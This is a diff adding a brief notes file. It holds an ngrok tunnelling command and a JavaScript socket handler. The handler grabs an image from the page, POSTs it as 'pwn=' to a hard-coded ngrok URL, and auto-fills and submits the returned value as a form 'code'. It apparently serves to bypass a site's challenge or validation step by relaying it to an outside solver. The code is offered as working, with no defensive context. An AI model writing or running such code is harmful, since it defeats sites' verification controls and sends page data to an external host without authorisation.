@@ -1,0 +1,24 @@
+# Ngrok Cors origin Option
+
+ngrok http -host-header=rewrite 3000
+
+
+# Socker Send Data on Code
+
+const NgrokDomain = "http://0583c523e6e7.ngrok.io"
+
+socket.on('catch_me', async function(){
+	const image = document.getElementById('catcher').src;
+
+	const headers = {
+		'method' : 'POST',
+		'body' : 'pwn='+image,
+	
+	};
+
+    let response = await fetch(NgrokDomain, headers);
+    response.text().then(unlock => {
+        document.forms[0]["code"].value=unlock;
+        document.forms[0].submit(); // you can also send an XHR request directly to /validate
+    });
+});
